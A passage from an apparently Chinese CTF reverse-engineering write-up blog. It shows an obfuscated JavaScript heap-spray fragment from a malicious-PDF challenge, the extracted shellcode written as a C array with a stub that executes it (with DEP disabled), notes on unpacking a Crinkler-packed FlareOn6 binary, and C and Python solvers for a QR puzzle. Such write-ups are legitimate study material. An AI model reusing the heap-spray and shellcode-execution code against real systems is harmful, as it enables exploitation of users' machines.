class="number">0</span>, bGtvKT);</span><br><span class="line">QCZabMzxQiD = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(<span class="number">0</span>, zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length-bGtvKT);</span><br><span class="line"><span class="keyword">while</span>(QCZabMzxQiD.length+bGtvKT &lt; <span class="number">0x40000</span>) QCZabMzxQiD = QCZabMzxQiD+QCZabMzxQiD+Juphd;</span><br><span class="line">FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=<span class="number">0</span>;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;<span class="number">125</span>;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = QCZabMzxQiD + zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">002050ff40000069000005695050</span><br></pre></td></tr></table></figure>

<p>还有个二进制文件，里面是pdf</p>
<p>上面js文件原来是shellcode，厉害</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="keyword">uint16_t</span> shellcode[] = &#123; <span class="number">0x72f9</span>,<span class="number">0x4649</span>,<span class="number">0x1525</span>,<span class="number">0x7f0d</span>,<span class="number">0x3d3c</span>,<span class="number">0xe084</span>,<span class="number">0xd62a</span>,<span class="number">0xe139</span>,<span class="number">0xa84a</span>,<span class="number">0x76b9</span>,<span class="number">0x9824</span>,<span class="number">0x7378</span>,<span class="number">0x7d71</span>,<span class="number">0x757f</span>,<span class="number">0x2076</span>,<span class="number">0x96d4</span>,<span class="number">0xba91</span>,<span class="number">0x1970</span>,<span class="number">0xb8f9</span>,<span class="number">0xe232</span>,<span class="number">0x467b</span>,<span class="number">0x9ba8</span>,<span class="number">0xfe01</span>,<span class="number">0xc7c6</span>,<span class="number">0xe3c1</span>,<span class="number">0x7e24</span>,<span class="number">0x437c</span>,<span class="number">0xe180</span>,<span class="number">0xb115</span>,<span class="number">0xb3b2</span>,<span class="number">0x4f66</span>,<span class="number">0x27b6</span>,<span class="number">0x9f3c</span>,<span class="number">0x7a4e</span>,<span class="number">0x412d</span>,<span class="number">0xbbbf</span>,<span class="number">0x7705</span>,<span class="number">0xf528</span>,<span class="number">0x9293</span>,<span class="number">0x9990</span>,<span class="number">0xa998</span>,<span class="number">0x0a47</span>,<span class="number">0x14eb</span>,<span class="number">0x3d49</span>,<span class="number">0x484b</span>,<span class="number">0x372f</span>,<span class="number">0xb98d</span>,<span class="number">0x3478</span>,<span class="number">0x0bb4</span>,<span class="number">0xd5d2</span>,<span class="number">0xe031</span>,<span class="number">0x3572</span>,<span class="number">0xd610</span>,<span class="number">0x6740</span>,<span class="number">0x2bbe</span>,<span class="number">0x4afd</span>,<span class="number">0x041c</span>,<span class="number">0x3f97</span>,<span class="number">0xfc3a</span>,<span class="number">0x7479</span>,<span class="number">0x421d</span>,<span class="number">0xb7b5</span>,<span class="number">0x0c2c</span>,<span class="number">0x130d</span>,<span class="number">0x25f8</span>,<span class="number">0x76b0</span>,<span class="number">0x4e79</span>,<span class="number">0x7bb1</span>,<span class="number">0x0c66</span>,<span class="number">0x2dbb</span>,<span class="number">0x911c</span>,<span class="number">0xa92f</span>,<span class="number">0xb82c</span>,<span class="number">0x8db0</span>,<span class="number">0x0d7e</span>,<span class="number">0x3b96</span>,<span class="number">0x49d4</span>,<span class="number">0xd56b</span>,<span class="number">0x03b7</span>,<span class="number">0xe1f7</span>,<span class="number">0x467d</span>,<span class="number">0x77b9</span>,<span class="number">0x3d42</span>,<span class="number">0x111d</span>,<span class="number">0x67e0</span>,<span class="number">0x4b92</span>,<span class="number">0xeb85</span>,<span class="number">0x2471</span>,<span class="number">0x9b48</span>,<span class="number">0xf902</span>,<span class="number">0x4f15</span>,<span class="number">0x04ba</span>,<span class="number">0xe300</span>,<span class="number">0x8727</span>,<span class="number">0x9fd6</span>,<span class="number">0x4770</span>,<span class="number">0x187a</span>,<span class="number">0x73e2</span>,<span class="number">0xfd1b</span>,<span class="number">0x2574</span>,<span class="number">0x437c</span>,<span class="number">0x4190</span>,<span class="number">0x97b6</span>,<span class="number">0x1499</span>,<span class="number">0x783c</span>,<span class="number">0x8337</span>,<span class="number">0xb3f8</span>,<span class="number">0x7235</span>,<span class="number">0x693f</span>,<span class="number">0x98f5</span>,<span class="number">0x7fbe</span>,<span class="number">0x4a75</span>,<span class="number">0xb493</span>,<span class="number">0xb5a8</span>,<span class="number">0x21bf</span>,<span class="number">0xfcd0</span>,<span class="number">0x3440</span>,<span class="number">0x057b</span>,<span class="number">0xb2b2</span>,<span class="number">0x7c71</span>,<span class="number">0x814e</span>,<span class="number">0x22e1</span>,<span class="number">0x04eb</span>,<span class="number">0x884a</span>,<span class="number">0x2ce2</span>,<span class="number">0x492d</span>,<span class="number">0x8d42</span>,<span class="number">0x75b3</span>,<span class="number">0xf523</span>,<span class="number">0x727f</span>,<span class="number">0xfc0b</span>,<span class="number">0x0197</span>,<span class="number">0xd3f7</span>,<span class="number">0x90f9</span>,<span class="number">0x41be</span>,<span class="number">0xa81c</span>,<span class="number">0x7d25</span>,<span class="number">0xb135</span>,<span class="number">0x7978</span>,<span class="number">0xf80a</span>,<span class="number">0xfd32</span>,<span class="number">0x769b</span>,<span class="number">0x921d</span>,<span class="number">0xbbb4</span>,<span class="number">0x77b8</span>,<span class="number">0x707e</span>,<span class="number">0x4073</span>,<span class="number">0x0c7a</span>,<span class="number">0xd689</span>,<span class="number">0x2491</span>,<span class="number">0x1446</span>,<span class="number">0x9fba</span>,<span class="number">0xc087</span>,<span class="number">0x0dd4</span>,<span class="number">0x4bb0</span>,<span class="number">0xb62f</span>,<span class="number">0xe381</span>,<span class="number">0x0574</span>,<span class="number">0x3fb9</span>,<span class="number">0x1b67</span>,<span class="number">0x93d5</span>,<span class="number">0x8396</span>,<span class="number">0x66e0</span>,<span class="number">0x47b5</span>,<span class="number">0x98b7</span>,<span class="number">0x153c</span>,<span class="number">0xa934</span>,<span class="number">0x3748</span>,<span class="number">0x3d27</span>,<span class="number">0x4f75</span>,<span class="number">0x8cbf</span>,<span class="number">0x43e2</span>,<span class="number">0xb899</span>,<span class="number">0x3873</span>,<span class="number">0x7deb</span>,<span class="number">0x257a</span>,<span class="number">0xf985</span>,<span class="number">0xbb8d</span>,<span class="number">0x7f91</span>,<span class="number">0x9667</span>,<span class="number">0xb292</span>,<span class="number">0x4879</span>,<span class="number">0x4a3c</span>,<span class="number">0xd433</span>,<span class="number">0x97a9</span>,<span class="number">0x377e</span>,<span class="number">0xb347</span>,<span class="number">0x933d</span>,<span class="number">0x0524</span>,<span class="number">0x9f3f</span>,<span class="number">0xe139</span>,<span class="number">0x3571</span>,<span class="number">0x23b4</span>,<span class="number">0xa8d6</span>,<span class="number">0x8814</span>,<span class="number">0xf8d1</span>,<span class="number">0x4272</span>,<span class="number">0x76ba</span>,<span class="number">0xfd08</span>,<span class="number">0xbe41</span>,<span class="number">0xb54b</span>,<span class="number">0x150d</span>,<span class="number">0x4377</span>,<span class="number">0x1174</span>,<span class="number">0x78e3</span>,<span class="number">0xe020</span>,<span class="number">0x041c</span>,<span class="number">0x40bf</span>,<span class="number">0xd510</span>,<span class="number">0xb727</span>,<span class="number">0x70b1</span>,<span class="number">0xf52b</span>,<span class="number">0x222f</span>,<span class="number">0x4efc</span>,<span class="number">0x989b</span>,<span class="number">0x901d</span>,<span class="number">0xb62c</span>,<span class="number">0x4f7c</span>,<span class="number">0x342d</span>,<span class="number">0x0c66</span>,<span class="number">0xb099</span>,<span class="number">0x7b49</span>,<span class="number">0x787a</span>,<span class="number">0x7f7e</span>,<span class="number">0x7d73</span>,<span class="number">0xb946</span>,<span class="number">0xb091</span>,<span class="number">0x928d</span>,<span class="number">0x90bf</span>,<span class="number">0x21b7</span>,<span class="number">0xe0f6</span>,<span class="number">0x134b</span>,<span class="number">0x29f5</span>,<span class="number">0x67eb</span>,<span class="number">0x2577</span>,<span class="number">0xe186</span>,<span class="number">0x2a05</span>,<span class="number">0x66d6</span>,<span class="number">0xa8b9</span>,<span class="number">0x1535</span>,<span class="number">0x4296</span>,<span class="number">0x3498</span>,<span class="number">0xb199</span>,<span class="number">0xb4ba</span>,<span class="number">0xb52c</span>,<span class="number">0xf812</span>,<span class="number">0x4f93</span>,<span class="number">0x7b76</span>,<span class="number">0x3079</span>,<span class="number">0xbefd</span>,<span class="number">0x3f71</span>,<span class="number">0x4e40</span>,<span class="number">0x7cb3</span>,<span class="number">0x2775</span>,<span class="number">0xe209</span>,<span class="number">0x4324</span>,<span class="number">0x0c70</span>,<span class="number">0x182d</span>,<span class="number">0x02e3</span>,<span class="number">0x4af9</span>,<span class="number">0xbb47</span>,<span class="number">0x41b6</span>,<span class="number">0x729f</span>,<span class="number">0x9748</span>,<span class="number">0xd480</span>,<span class="number">0xd528</span>,<span class="number">0x749b</span>,<span class="number">0x1c3c</span>,<span class="number">0xfc84</span>,<span class="number">0x497d</span>,<span class="number">0x7eb8</span>,<span class="number">0xd26b</span>,<span class="number">0x1de0</span>,<span class="number">0x0d76</span>,<span class="number">0x3174</span>,<span class="number">0x14eb</span>,<span class="number">0x3770</span>,<span class="number">0x71a9</span>,<span class="number">0x723d</span>,<span class="number">0xb246</span>,<span class="number">0x2f78</span>,<span class="number">0x047f</span>,<span class="number">0xb6a9</span>,<span class="number">0x1c7b</span>,<span class="number">0x3a73</span>,<span class="number">0x3ce1</span>,<span class="number">0x19be</span>,<span class="number">0x34f9</span>,<span class="number">0xd500</span>,<span class="number">0x037a</span>,<span class="number">0xe2f8</span>,<span class="number">0xb024</span>,<span class="number">0xfd4e</span>,<span class="number">0x3d79</span>,<span class="number">0x7596</span>,<span class="number">0x9b15</span>,<span class="number">0x7c49</span>,<span class="number">0xb42f</span>,<span class="number">0x9f4f</span>,<span class="number">0x4799</span>,<span class="number">0xc13b</span>,<span class="number">0xe3d0</span>,<span class="number">0x4014</span>,<span class="number">0x903f</span>,<span class="number">0x41bf</span>,<span class="number">0x4397</span>,<span class="number">0xb88d</span>,<span class="number">0xb548</span>,<span class="number">0x0d77</span>,<span class="number">0x4ab2</span>,<span class="number">0x2d93</span>,<span class="number">0x9267</span>,<span class="number">0xb198</span>,<span class="number">0xfc1a</span>,<span class="number">0xd4b9</span>,<span class="number">0xb32c</span>,<span class="number">0xbaf5</span>,<span class="number">0x690c</span>,<span class="number">0x91d6</span>,<span class="number">0x04a8</span>,<span class="number">0x1dbb</span>,<span class="number">0x4666</span>,<span class="number">0x2505</span>,<span class="number">0x35b7</span>,<span class="number">0x3742</span>,<span class="number">0x4b27</span>,<span class="number">0xfc90</span>,<span class="number">0xd233</span>,<span class="number">0x30b2</span>,<span class="number">0xff64</span>,<span class="number">0x5a32</span>,<span class="number">0x528b</span>,<span class="number">0x8b0c</span>,<span class="number">0x1452</span>,<span class="number">0x728b</span>,<span class="number">0x3328</span>,<span class="number">0xb1c9</span>,<span class="number">0x3318</span>,<span class="number">0x33ff</span>,<span class="number">0xacc0</span>,<span class="number">0x613c</span>,<span class="number">0x027c</span>,<span class="number">0x202c</span>,<span class="number">0xcfc1</span>,<span class="number">0x030d</span>,<span class="number">0xe2f8</span>,<span class="number">0x81f0</span>,<span class="number">0x5bff</span>,<span class="number">0x4abc</span>,<span class="number">0x8b6a</span>,<span class="number">0x105a</span>,<span class="number">0x128b</span>,<span class="number">0xda75</span>,<span class="number">0x538b</span>,<span class="number">0x033c</span>,<span class="number">0xffd3</span>,<span class="number">0x3472</span>,<span class="number">0x528b</span>,<span class="number">0x0378</span>,<span class="number">0x8bd3</span>,<span class="number">0x2072</span>,<span class="number">0xf303</span>,<span class="number">0xc933</span>,<span class="number">0xad41</span>,<span class="number">0xc303</span>,<span class="number">0x3881</span>,<span class="number">0x6547</span>,<span class="number">0x5074</span>,<span class="number">0xf475</span>,<span class="number">0x7881</span>,<span class="number">0x7204</span>,<span class="number">0x636f</span>,<span class="number">0x7541</span>,<span class="number">0x81eb</span>,<span class="number">0x0878</span>,<span class="number">0x6464</span>,<span class="number">0x6572</span>,<span class="number">0xe275</span>,<span class="number">0x8b49</span>,<span class="number">0x2472</span>,<span class="number">0xf303</span>,<span class="number">0x8b66</span>,<span class="number">0x4e0c</span>,<span class="number">0x728b</span>,<span class="number">0x031c</span>,<span class="number">0x8bf3</span>,<span class="number">0x8e14</span>,<span class="number">0xd303</span>,<span class="number">0x3352</span>,<span class="number">0x57ff</span>,<span class="number">0x6168</span>,<span class="number">0x7972</span>,<span class="number">0x6841</span>,<span class="number">0x694c</span>,<span class="number">0x7262</span>,<span class="number">0x4c68</span>,<span class="number">0x616f</span>,<span class="number">0x5464</span>,<span class="number">0xff53</span>,<span class="number">0x68d2</span>,<span class="number">0x3233</span>,<span class="number">0x0101</span>,<span class="number">0x8966</span>,<span class="number">0x247c</span>,<span class="number">0x6802</span>,<span class="number">0x7375</span>,<span class="number">0x7265</span>,<span class="number">0xff54</span>,<span class="number">0x68d0</span>,<span class="number">0x786f</span>,<span class="number">0x0141</span>,<span class="number">0xdf8b</span>,<span class="number">0x5c88</span>,<span class="number">0x0324</span>,<span class="number">0x6168</span>,<span class="number">0x6567</span>,<span class="number">0x6842</span>,<span class="number">0x654d</span>,<span class="number">0x7373</span>,<span class="number">0x5054</span>,<span class="number">0x54ff</span>,<span class="number">0x2c24</span>,<span class="number">0x6857</span>,<span class="number">0x2144</span>,<span class="number">0x2121</span>,<span class="number">0x4f68</span>,<span class="number">0x4e57</span>,<span class="number">0x8b45</span>,<span class="number">0xe8dc</span>,<span class="number">0x0000</span>,<span class="number">0x0000</span>,<span class="number">0x148b</span>,<span class="number">0x8124</span>,<span class="number">0x0b72</span>,<span class="number">0xa316</span>,<span class="number">0x32fb</span>,<span class="number">0x7968</span>,<span class="number">0xbece</span>,<span class="number">0x8132</span>,<span class="number">0x1772</span>,<span class="number">0x45ae</span>,<span class="number">0x48cf</span>,<span class="number">0xc168</span>,<span class="number">0xe12b</span>,<span class="number">0x812b</span>,<span class="number">0x2372</span>,<span class="number">0x3610</span>,<span class="number">0xd29f</span>,<span class="number">0x7168</span>,<span class="number">0xfa44</span>,<span class="number">0x81ff</span>,<span class="number">0x2f72</span>,<span class="number">0xa9f7</span>,<span class="number">0x0ca9</span>,<span class="number">0x8468</span>,<span class="number">0xcfe9</span>,<span class="number">0x8160</span>,<span class="number">0x3b72</span>,<span class="number">0x93be</span>,<span class="number">0x43a9</span>,<span class="number">0xd268</span>,<span class="number">0x98a3</span>,<span class="number">0x8137</span>,<span class="number">0x4772</span>,<span class="number">0x8a82</span>,<span class="number">0x3b62</span>,<span class="number">0xef68</span>,<span class="number">0x11a4</span>,<span class="number">0x814b</span>,<span class="number">0x5372</span>,<span class="number">0x47d6</span>,<span class="number">0xccc0</span>,<span class="number">0xbe68</span>,<span class="number">0xa469</span>,<span class="number">0x81ff</span>,<span class="number">0x5f72</span>,<span class="number">0xcaa3</span>,<span class="number">0x3154</span>,<span class="number">0xd468</span>,<span class="number">0x65ab</span>,<span class="number">0x8b52</span>,<span class="number">0x57cc</span>,<span class="number">0x5153</span>,<span class="number">0x8b57</span>,<span class="number">0x89f1</span>,<span class="number">0x83f7</span>,<span class="number">0x1ec7</span>,<span class="number">0xfe39</span>,<span class="number">0x0b7d</span>,<span class="number">0x3681</span>,<span class="number">0x4542</span>,<span class="number">0x4645</span>,<span class="number">0xc683</span>,<span class="number">0xeb04</span>,<span class="number">0xfff1</span>,<span class="number">0x68d0</span>,<span class="number">0x7365</span>,<span class="number">0x0173</span>,<span class="number">0xdf8b</span>,<span class="number">0x5c88</span>,<span class="number">0x0324</span>,<span class="number">0x5068</span>,<span class="number">0x6f72</span>,<span class="number">0x6863</span>,<span class="number">0x7845</span>,<span class="number">0x7469</span>,<span class="number">0xff54</span>,<span class="number">0x2474</span>,<span class="number">0xff40</span>,<span class="number">0x2454</span>,<span class="number">0x5740</span>,<span class="number">0xd0ff</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    ((<span class="keyword">void</span>(*)()) &amp; shellcode)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>windows上面关闭DEP，编译调试，就得到flag了</p>
<h2 id="rev-FlareOn6-demo"><a href="#rev-FlareOn6-demo" class="headerlink" title="[rev][FlareOn6]demo"></a>[rev][FlareOn6]demo</h2><p>IDA7.5识别不了</p>
<p><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/flare-on-2019/demo.html#">https://0xdf.gitlab.io/flare-on-2019/demo.html#</a></p>
<p><a target="_blank" rel="noopener" href="https://malwareunicorn.org/workshops/flareon6_2019.html#5">https://malwareunicorn.org/workshops/flareon6_2019.html#5</a></p>
<p>看wp，加了<a target="_blank" rel="noopener" href="https://github.com/runestubbe/Crinkler">https://github.com/runestubbe/Crinkler</a> 壳，可以使用esp定律法脱壳</p>
<p>具体做法：x32dbg调试在主函数中发现了pushad，可以使用graph命令绘制流程图，然后发现多次pushad，popad，直接执行到ret，再单步即可脱壳。</p>
<p>接下来可以获取各个函数的功能</p>
<p>最后有个D3DXTranslation，把第一个参数改为0即可</p>
<h2 id="rev-Zer0pts2020-QR-Puzzle"><a href="#rev-Zer0pts2020-QR-Puzzle" class="headerlink" title="[rev][Zer0pts2020]QR Puzzle"></a>[rev][Zer0pts2020]QR Puzzle</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;setimp.h&gt;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">KeyList</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k1,k2,k3;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">KeyList</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125; KeyList;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *v,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>,v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint8_t</span> **data, KeyList*klp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> v2,v3,*v4,*v5;</span><br><span class="line">    <span class="keyword">while</span>(klp-&gt;next)&#123;</span><br><span class="line">        <span class="keyword">switch</span>(klp-&gt;k3)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            v3=klp-&gt;k1<span class="number">-1</span>;</span><br><span class="line">            v2=klp-&gt;k2;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            v3=klp-&gt;k1+<span class="number">1</span>;</span><br><span class="line">            v2=klp-&gt;k2;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            v3=klp-&gt;k1;</span><br><span class="line">            v2=klp-&gt;k2<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            v3=klp-&gt;k1;</span><br><span class="line">            v2=klp-&gt;k2+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v4=data[klp-&gt;k2];</span><br><span class="line">        v5=data[v2];</span><br><span class="line">        v4[klp-&gt;k1]+=v5[v3];</span><br><span class="line">        v5[v3]=v4[klp-&gt;k1]-v5[v3];</span><br><span class="line">        v4[klp-&gt;k1]-=v5[v3];</span><br><span class="line">        klp=klp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readKey</span><span class="params">(KeyList *klp)</span></span>&#123;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(f,<span class="string">&quot;%d#(%d,%d)&quot;</span>,&amp;klp-&gt;k3,&amp;klp-&gt;k1,&amp;klp-&gt;k2)==<span class="number">3</span>)&#123;</span><br><span class="line">        klp-&gt;next=(KeyList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(KeyList));</span><br><span class="line">        klp=klp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    klp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    fclose(f);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span>** <span class="title">readData</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;encrypted.qr&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> **data = (<span class="keyword">uint8_t</span> **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>*)*<span class="number">25</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        data[i] = (<span class="keyword">uint8_t</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>)*<span class="number">26</span>);</span><br><span class="line">        <span class="built_in">fscanf</span>(f,<span class="string">&quot;%s&quot;</span>,(<span class="keyword">char</span>*)data[i]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">25</span>;j++)&#123;</span><br><span class="line">            data[i][j] -=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(f);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writeData</span><span class="params">(<span class="keyword">uint8_t</span> **data)</span></span>&#123;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;decrypted.qr&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">25</span>;j++)&#123;</span><br><span class="line">            fputc(data[i][j]+<span class="string">&#x27;0&#x27;</span>,f);</span><br><span class="line">        &#125;</span><br><span class="line">        fputc(<span class="string">&#x27;\n&#x27;</span>,f);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(f);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span>**data=readData();</span><br><span class="line">    KeyList kl;</span><br><span class="line">    readKey(&amp;kl);</span><br><span class="line">    decrypt(data,&amp;kl);</span><br><span class="line">    writeData(data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">lines = []</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;decrypted.qr&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">print(len(lines),len(lines[<span class="number">0</span>]))</span><br><span class="line">img = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">    img0 = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i[:<span class="number">-1</span>]:</span><br><span class="line">        img0.append(<span class="number">0</span> <span class="keyword">if</span> j==<span class="string">&#x27;0&#x27;</span> <span class="keyword">else</span> <span class="number">1</span>)</span><br><span class="line">    img.append(img0)</span><br><span class="line">plt.imshow(img)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h2 id="rev-FlareOn2-sender"><a href="#rev-FlareOn2-sender" class="headerlink" title="[rev][FlareOn2]sender"></a>[rev][FlareOn2]sender</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 